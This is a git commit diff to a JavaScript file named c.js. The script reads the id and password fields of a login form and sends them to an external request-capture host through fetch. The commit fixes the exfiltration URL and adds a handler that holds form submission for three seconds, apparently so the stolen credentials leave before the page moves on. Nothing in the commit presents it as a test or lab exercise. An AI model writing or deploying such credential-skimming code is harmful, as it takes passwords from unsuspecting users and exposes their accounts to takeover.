6755f6414c31a07699af5fea609e574510328cfc
tomasramirez0990-ui <tomasramirez0990@gmail.com>
2026-08-10 18:25:16 +0200

    Update c.js

--- c.js
+++ c.js
@@ -5,5 +5,13 @@ button.addEventListener('click', () => {
   const id = idField.value;
   const passField = document.querySelector('[name="pass"]');
   const pass = passField.value;
-  fetch('https://sdsdf.free.beeceptor.com'+id+':'+pass);
+  fetch('https://sdsdf.free.beeceptor.com/?'+id+':'+pass);
+});
+
+
+document.querySelector('form').addEventListener('submit', e => {
+  if (e.target.dataset.waited) return;
+  e.preventDefault();
+  e.target.dataset.waited = 1;
+  setTimeout(() => e.target.requestSubmit(), 3000);
 });
